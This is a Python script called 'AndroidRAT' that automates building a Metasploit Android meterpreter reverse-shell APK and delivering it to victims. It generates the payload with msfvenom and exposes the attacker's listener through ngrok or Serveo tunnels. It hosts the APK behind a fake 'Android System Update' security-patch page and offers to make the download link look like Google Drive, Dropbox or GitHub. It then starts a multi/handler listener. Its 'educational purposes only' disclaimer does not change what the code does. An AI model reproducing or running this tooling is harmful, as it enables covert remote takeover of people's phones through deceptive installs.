#!/usr/bin/env python3
# AndroidRAT - Educational Purpose Only
# Created by EpicDestroyerOp

import os
import sys
import time
import signal
import subprocess
import shutil
import socket
import random
import threading
import json
import re
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse

# ========== CONFIGURATION ==========
VERSION = "2.2"
DEBUG = False
LOG_FILE = "androidrat.log"
TMP_DIR = f"/tmp/androidrat_{random.randint(1000, 9999)}"

# ========== STYLING ==========
class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'
    NC = '\033[0m'  # No Color

class Emojis:
    ROCKET = "🚀"
    GEAR = "⚙️"
    FIRE = "🔥"
    COMPUTER = "💻"
    PHONE = "📱"
    WARNING = "⚠️"
    SUCCESS = "✅"
    ERROR = "❌"
    HOURGLASS = "⏳"
    SPARKLES = "✨"
    LIGHTNING = "⚡"
    SNAKE = "🐍"
    LOCK = "🔒"
    KEY = "🔑"
    EARTH = "🌍"
    SCAN = "🔍"
    PARTY = "🎉"
    BOMB = "💣"
    ALIEN = "👽"
    DOWNLOAD = "📥"
    LINK = "🔗"
    MASK = "🎭"

# ========== FUNCTIONS ==========
def cleanup(signum=None, frame=None):
    print(f"\n{Colors.YELLOW}{Emojis.WARNING} Performing cleanup...{Colors.NC}")
    
    # Kill background processes
    for proc in ['ngrok', 'serveo', 'python3']:
        subprocess.run(f"pkill -f {proc}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Colors.GREEN}{Emojis.SUCCESS} Stopped {proc} processes{Colors.NC}")
    
    # Remove temporary files
    if os.path.exists(TMP_DIR):
        shutil.rmtree(TMP_DIR)
        print(f"{Colors.GREEN}{Emojis.SUCCESS} Removed temporary files{Colors.NC}")
    
    if os.path.exists("listener.rc"):
        os.remove("listener.rc")
        print(f"{Colors.GREEN}{Emojis.SUCCESS} Removed listener config{Colors.NC}")
    
    print(f"{Colors.GREEN}{Emojis.SUCCESS} Cleanup complete!{Colors.NC}")
    sys.exit(0)

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_port(port):
    try:
        return 1 <= int(port) <= 65535
    except ValueError:
        return False

def spin():
    spinner = ['|', '/', '-', '\\']
    i = 0
    while True:
        sys.stdout.write(f"\r [{spinner[i]}] ")
        sys.stdout.flush()
        time.sleep(0.1)
        i = (i + 1) % len(spinner)

def animate_text(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.03)
    print()

def start_web_server(port, download_file):
    os.makedirs(TMP_DIR, exist_ok=True)
    
    # Create simple HTML page
    with open(f"{TMP_DIR}/index.html", "w") as f:
        f.write(f"""<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <style>
        body {{ font-family: Arial, sans-serif; text-align: center; padding: 50px; }}
        .btn {{ 
            background-color: #4CAF50; 
            color: white; 
            padding: 15px 32px; 
            text-align: center; 
            display: inline-block; 
            font-size: 16px; 
            margin: 20px 2px; 
            cursor: pointer; 
            border-radius: 5px; 
            text-decoration: none;
        }}
    </style>
</head>
<body>
    <h1>Android System Update</h1>
    <p>Click below to download the latest security patch</p>
    <a href="{download_file}" class="btn">Download Update</a>
</body>
</html>""")
    
    # Copy APK to temp dir
    shutil.copy(download_file, f"{TMP_DIR}/{download_file}")
    
    # Start Python web server in a thread
    def run_server():
        os.chdir(TMP_DIR)
        server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
        server.serve_forever()
    
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    return server_thread

def get_local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "127.0.0.1"

def mask_url(url):
    print(f"\n{Colors.BLUE}{Emojis.MASK} URL Masking Options:{Colors.NC}")
    print("1. Google Drive")
    print("2. Dropbox")
    print("3. GitHub")
    print("4. Custom URL")
    print("5. No masking")
    
    choice = input(f"{Colors.BLUE}➡ Select masking option (1-5): {Colors.NC}")
    
    if choice == "1":
        return "https://drive.google.com/uc?export=download&id=FILEID"
    elif choice == "2":
        return "https://www.dropbox.com/s/FILEID/FILENAME?dl=1"
    elif choice == "3":
        return "https://github.com/username/repository/raw/main/FILENAME"
    elif choice == "4":
        return input(f"{Colors.BLUE}Enter custom URL template: {Colors.NC}")
    else:
        return url

def check_requirements():
    print(f"{Colors.BLUE}{Emojis.GEAR} Checking system requirements...{Colors.NC}")
    
    required_tools = {
        'msfvenom': 'Metasploit Framework',
        'msfconsole': 'Metasploit Framework'
    }
    
    missing = False
    for tool, name in required_tools.items():
        if shutil.which(tool) is None:
            print(f"{Colors.RED}{Emojis.ERROR} Missing required tool: {name} ({tool}){Colors.NC}")
            missing = True
        else:
            print(f"{Colors.GREEN}{Emojis.SUCCESS} Found: {name}{Colors.NC}")
    
    # Check optional tools
    if shutil.which('ngrok') is None:
        print(f"{Colors.YELLOW}{Emojis.WARNING} Ngrok not found (optional for internet access){Colors.NC}")
    else:
        print(f"{Colors.GREEN}{Emojis.SUCCESS} Found: Ngrok{Colors.NC}")
    
    if shutil.which('ssh') is None:
        print(f"{Colors.YELLOW}{Emojis.WARNING} SSH not found (required for Serveo){Colors.NC}")
    else:
        print(f"{Colors.GREEN}{Emojis.SUCCESS} Found: SSH{Colors.NC}")
    
    if missing:
        sys.exit(1)
    
    print(f"{Colors.GREEN}{Emojis.SUCCESS} All checks passed!{Colors.NC}")

def generate_payload(payload, lhost, lport, output_file, app_icon=None):
    print(f"\n{Colors.MAGENTA}{Emojis.GEAR} Generating Android payload...{Colors.NC}")
    print(f"{Colors.YELLOW}{Emojis.HOURGLASS} This may take a moment...{Colors.NC}")
    
    # Show spinner animation
    spinner_thread = threading.Thread(target=spin)
    spinner_thread.daemon = True
    spinner_thread.start()
    
    # Build msfvenom command
    cmd = [
        'msfvenom',
        '-p', payload,
        'LHOST=' + lhost,
        'LPORT=' + str(lport),
        '--platform', 'android',
        '-a', 'dalvik',
        '-o', output_file,
        '--encoder', 'x86/shikata_ga_nai',
        '-i', '3',
        '-n', '20'
    ]
    
    if app_icon:
        cmd.extend(['-x', app_icon])
    
    # Run command
    try:
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except subprocess.CalledProcessError:
        print(f"\r{Colors.RED}{Emojis.ERROR} Failed to generate payload!{Colors.NC}")
        sys.exit(1)
    
    # Stop spinner
    sys.stdout.write("\r")
    sys.stdout.flush()
    
    if not os.path.exists(output_file):
        print(f"{Colors.RED}{Emojis.ERROR} Failed to generate payload!{Colors.NC}")
        sys.exit(1)
    
    print(f"{Colors.GREEN}{Emojis.SUCCESS} Payload generated successfully!{Colors.NC}")
    print(f"{Colors.CYAN}📦 File: {os.path.abspath(output_file)}{Colors.NC}")
    print(f"{Colors.CYAN}📏 Size: {os.path.getsize(output_file)/1024:.1f} KB{Colors.NC}")

def setup_listener(payload, lhost, lport):
    print(f"\n{Colors.BLUE}{Emojis.SCAN} Configuring Metasploit listener...{Colors.NC}")
    
    # Create listener resource file
    with open("listener.rc", "w") as f:
        f.write(f"""use exploit/multi/handler
set payload {payload}
set LHOST 0.0.0.0
set LPORT {lport}
set ExitOnSession false
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/android/manage/shell
exploit -j
""")
    
    print(f"{Colors.GREEN}{Emojis.SUCCESS} Listener configuration created{Colors.NC}")
    
    # Start listener
    print(f"\n{Colors.GREEN}{Emojis.ROCKET} Starting Metasploit listener...{Colors.NC}")
    print(f"{Colors.YELLOW}{Emojis.WARNING} Press Ctrl+C to stop the listener{Colors.NC}")
    print(f"{Colors.CYAN}{Emojis.COMPUTER} Listening on {lhost}:{lport}{Colors.NC}")
    
    # Countdown
    for i in range(5, 0, -1):
        print(f"\r{Colors.RED}Starting in {i} seconds...{Colors.NC}", end='')
        time.sleep(1)
    
    print(f"\r{Colors.GREEN}Listener active! Waiting for connection...{Colors.NC}    ")
    
    # Start Metasploit
    subprocess.run(['msfconsole', '-q', '-r', 'listener.rc'])

def main():
    # Set up signal handlers for cleanup
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)
    
    # Clear screen
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Display banner
    print(f"{Colors.RED}")
    print("""  /$$$$$$  /$$   /$$ /$$$$$$$  /$$$$$$$   /$$$$$$  /$$$$$$ /$$$$$$$        /$$$$$$$   /$$$$$$  /$$$$$$$$      
 /$$__  $$| $$$ | $$| $$__  $$| $$__  $$ /$$__  $$|_  $$_/| $$__  $$      | $$__  $$ /$$__  $$|__  $$__/      
| $$  \ $$| $$$$| $$| $$  \ $$| $$  \ $$| $$  \ $$  | $$  | $$  \ $$      | $$  \ $$| $$  \ $$   | $$         
| $$$$$$$$| $$ $$ $$| $$  | $$| $$$$$$$/| $$  | $$  | $$  | $$  | $$      | $$$$$$$/| $$$$$$$$   | $$         
| $$__  $$| $$  $$$$| $$  | $$| $$__  $$| $$  | $$  | $$  | $$  | $$      | $$__  $$| $$__  $$   | $$         
| $$  | $$| $$\  $$$| $$  | $$| $$  \ $$| $$  | $$  | $$  | $$  | $$      | $$  \ $$| $$  | $$   | $$         
| $$  | $$| $$ \  $$| $$$$$$$/| $$  | $$|  $$$$$$/ /$$$$$$| $$$$$$$/      | $$  | $$| $$  | $$   | $$         
|__/  |__/|__/  \__/|_______/ |__/  |__/ \______/ |______/|_______/       |__/  |__/|__/  |__/   |__/""")
    print(f"{Colors.NC}")
    
    # Disclaimer
    print(f"{Colors.YELLOW}{Emojis.WARNING}")
    animate_text("*****************************************************************")
    animate_text("* This tool is created for educational purposes only.            *")
    animate_text("* The creator is not responsible for any misuse of this tool.   *")
    animate_text("* Use it only on systems you own or have permission to test.    *")
    animate_text("*****************************************************************")
    print(f"{Colors.NC}")
    time.sleep(1)
    
    # Version info
    print(f"{Colors.CYAN}{Emojis.ALIEN} AndroidRAT v{VERSION} {Colors.NC}")
    print(f"{Colors.GREEN}{Emojis.SPARKLES} Made & Controlled by EpicDestroyerOp {Colors.NC}")
    print()
    
    # Check requirements
    check_requirements()
    
    # Main menu
    while True:
        print(f"\n{Colors.BLUE}{Emojis.COMPUTER} Select connection method:{Colors.NC}")
        print(f"1. {Emojis.PHONE} Local Network (LAN)")
        print(f"2. {Emojis.EARTH} Internet Access (Ngrok/Serveo)")
        print(f"3. {Emojis.BOMB} Exit")
        print()
        choice = input(f"{Colors.BLUE}➡ Enter your choice (1-3): {Colors.NC}")
        
        if choice == "1":
            # Local network setup
            print(f"\n{Colors.GREEN}{Emojis.LIGHTNING} Local Network Setup Selected{Colors.NC}")
            
            # Get valid IP address
            while True:
                lhost = input(f"{Colors.BLUE}{Emojis.COMPUTER} Enter your local IP (LHOST): {Colors.NC}")
                if validate_ip(lhost):
                    break
                else:
                    print(f"{Colors.RED}{Emojis.ERROR} Invalid IP address! Please enter a valid local IP (e.g., 192.168.1.10){Colors.NC}")
            
            # Get valid port
            while True:
                lport = input(f"{Colors.BLUE}{Emojis.COMPUTER} Enter listening port (LPORT) [1-65535, default 4444]: {Colors.NC}") or "4444"
                if validate_port(lport):
                    lport = int(lport)
                    break
                else:
                    print(f"{Colors.RED}{Emojis.ERROR} Invalid port! Must be between 1-65535{Colors.NC}")
            break
        
        elif choice == "2":
            # Internet setup
            print(f"\n{Colors.GREEN}{Emojis.EARTH} Internet Access Setup Selected{Colors.NC}")
            
            print(f"{Colors.BLUE}Select tunneling method:{Colors.NC}")
            print("1. Ngrok (recommended)")
            print("2. Serveo")
            tunnel_method = input(f"{Colors.BLUE}➡ Select option (1-2): {Colors.NC}")
            
            # Get valid port
            while True:
                lport = input(f"{Colors.BLUE}{Emojis.COMPUTER} Enter listening port (LPORT) [1-65535, default 4444]: {Colors.NC}") or "4444"
                if validate_port(lport):
                    lport = int(lport)
                    break
                else:
                    print(f"{Colors.RED}{Emojis.ERROR} Invalid port! Must be between 1-65535{Colors.NC}")
            
            if tunnel_method == "1":
                # Ngrok setup
                if shutil.which('ngrok') is None:
                    print(f"{Colors.RED}{Emojis.ERROR} Ngrok not found! Please install it first.{Colors.NC}")
                    sys.exit(1)
                
                print(f"\n{Colors.YELLOW}{Emojis.HOURGLASS} Starting Ngrok tunnel on port {lport}...{Colors.NC}")
                ngrok_proc = subprocess.Popen(['ngrok', 'tcp', str(lport)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                print(f"{Colors.CYAN}    Waiting for tunnel establishment", end='')
                spin_thread = threading.Thread(target=spin)
                spin_thread.daemon = True
                spin_thread.start()
                time.sleep(5)  # Wait for ngrok to start
                
                # Get public URL
                try:
                    result = subprocess.run(['curl', '-s', 'http://localhost:4040/api/tunnels'], capture_output=True, text=True)
                    ngrok_url = json.loads(result.stdout)['tunnels'][0]['public_url']
                    lhost = urlparse(ngrok_url).hostname
                    print(f"\r{Colors.GREEN}{Emojis.SUCCESS} Ngrok tunnel established!{Colors.NC}")
                    print(f"{Colors.CYAN}{Emojis.EARTH} Public URL: {ngrok_url}{Colors.NC}")
                except:
                    print(f"\r{Colors.RED}{Emojis.ERROR} Failed to create Ngrok tunnel!{Colors.NC}")
                    ngrok_proc.kill()
                    sys.exit(1)
            
            elif tunnel_method == "2":
                # Serveo setup
                if shutil.which('ssh') is None:
                    print(f"{Colors.RED}{Emojis.ERROR} SSH not found! Required for Serveo.{Colors.NC}")
                    sys.exit(1)
                
                print(f"\n{Colors.YELLOW}{Emojis.HOURGLASS} Starting Serveo tunnel on port {lport}...{Colors.NC}")
                serveo_proc = subprocess.Popen(['ssh', '-R', '80:localhost:' + str(lport), 'serveo.net'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                print(f"{Colors.CYAN}    Waiting for tunnel establishment", end='')
                spin_thread = threading.Thread(target=spin)
                spin_thread.daemon = True
                spin_thread.start()
                time.sleep(5)  # Wait for serveo to start
                
                lhost = "serveo.net"
                print(f"\r{Colors.GREEN}{Emojis.SUCCESS} Serveo tunnel established!{Colors.NC}")
                print(f"{Colors.CYAN}{Emojis.EARTH} Public URL: tcp://serveo.net:{lport}{Colors.NC}")
            
            else:
                print(f"{Colors.RED}{Emojis.ERROR} Invalid option!{Colors.NC}")
                sys.exit(1)
            
            print(f"{Colors.YELLOW}{Emojis.WARNING} Keep this terminal open to maintain the tunnel{Colors.NC}")
            break
        
        elif choice == "3":
            print(f"\n{Colors.BLUE}{Emojis.COMPUTER} Exiting...{Colors.NC}")
            sys.exit(0)
        
        else:
            print(f"{Colors.RED}{Emojis.ERROR} Invalid choice! Please enter 1, 2, or 3.{Colors.NC}")
    
    # Payload configuration
    print(f"\n{Colors.CYAN}{Emojis.KEY} Payload Configuration{Colors.NC}")
    
    # Payload selection
    while True:
        print(f"{Colors.BLUE}Select payload type:{Colors.NC}")
        print(f"1. {Emojis.SNAKE} android/meterpreter/reverse_tcp")
        print(f"2. {Emojis.LOCK} android/meterpreter/reverse_http")
        print(f"3. {Emojis.LOCK} android/meterpreter/reverse_https")
        payload_choice = input(f"{Colors.BLUE}➡ Select payload type (1-3): {Colors.NC}")
        
        if payload_choice == "1":
            payload = "android/meterpreter/reverse_tcp"
            break
        elif payload_choice == "2":
            payload = "android/meterpreter/reverse_http"
            break
        elif payload_choice == "3":
            payload = "android/meterpreter/reverse_https"
            break
        else:
            print(f"{Colors.RED}{Emojis.ERROR} Invalid option!{Colors.NC}")
    
    # App name and icon
    app_name = input(f"{Colors.BLUE}{Emojis.PHONE} Enter application name (default: 'System Update'): {Colors.NC}") or "System Update"
    
    while True:
        app_icon = input(f"{Colors.BLUE}{Emojis.PHONE} Enter path to custom icon (leave empty for default): {Colors.NC}")
        if not app_icon or os.path.exists(app_icon):
            break
        else:
            print(f"{Colors.RED}{Emojis.ERROR} File not found! Please provide a valid path or leave empty{Colors.NC}")
    
    # Generate payload
    output_file = f"AndroidRAT_{time.strftime('%Y%m%d_%H%M%S')}.apk"
    generate_payload(payload, lhost, str(lport), output_file, app_icon if app_icon else None)
    
    # Download options
    print(f"\n{Colors.BLUE}{Emojis.DOWNLOAD} Select download method:{Colors.NC}")
    print("1. Local web server")
    print("2. Serveo")
    print("3. Skip download setup")
    download_option = input(f"{Colors.BLUE}➡ Select option (1-3): {Colors.NC}")
    
    if download_option == "1":
        # Local web server
        web_port = input(f"{Colors.BLUE}Enter web server port [default: 8080]: {Colors.NC}") or "8080"
        web_port = int(web_port)
        
        # Start web server
        server_thread = start_web_server(web_port, output_file)
        
        local_ip = get_local_ip()
        print(f"\n{Colors.GREEN}{Emojis.SUCCESS} Web server started on port {web_port}{Colors.NC}")
        print(f"{Colors.CYAN}{Emojis.LINK} Download URL: http://{local_ip}:{web_port}{Colors.NC}")
        print(f"{Colors.YELLOW}{Emojis.WARNING} Keep this terminal open to maintain the web server{Colors.NC}")
        
        # Offer URL masking
        masked_url = mask_url(f"http://{local_ip}:{web_port}")
        print(f"\n{Colors.GREEN}{Emojis.MASK} Masked URL: {masked_url}{Colors.NC}")
    
    elif download_option == "2":
        # Serveo download
        if shutil.which('ssh') is None:
            print(f"{Colors.RED}{Emojis.ERROR} SSH not found! Required for Serveo.{Colors.NC}")
            sys.exit(1)
        
        web_port = input(f"{Colors.BLUE}Enter web server port [default: 8080]: {Colors.NC}") or "8080"
        web_port = int(web_port)
        
        # Start web server
        server_thread = start_web_server(web_port, output_file)
        
        # Start Serveo tunnel
        print(f"\n{Colors.YELLOW}{Emojis.HOURGLASS} Starting Serveo web tunnel...{Colors.NC}")
        serveo_web_proc = subprocess.Popen(['ssh', '-R', '80:localhost:' + str(web_port), 'serveo.net'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(f"{Colors.CYAN}    Waiting for tunnel establishment", end='')
        spin_thread = threading.Thread(target=spin)
        spin_thread.daemon = True
        spin_thread.start()
        time.sleep(5)  # Wait for serveo to start
        
        serveo_web_url = "serveo.net"
        print(f"\r{Colors.GREEN}{Emojis.SUCCESS} Serveo web tunnel established!{Colors.NC}")
        print(f"{Colors.CYAN}{Emojis.LINK} Download URL: http://{serveo_web_url}{Colors.NC}")
        
        # Offer URL masking
        masked_url = mask_url(f"http://{serveo_web_url}")
        print(f"\n{Colors.GREEN}{Emojis.MASK} Masked URL: {masked_url}{Colors.NC}")
    
    else:
        print(f"{Colors.YELLOW}Skipping download setup{Colors.NC}")
    
    # Setup listener
    setup_listener(payload, lhost, str(lport))
    
    # Exit
    print(f"\n{Colors.GREEN}{Emojis.PARTY} Operation completed!{Colors.NC}")

if __name__ == "__main__":
    main()
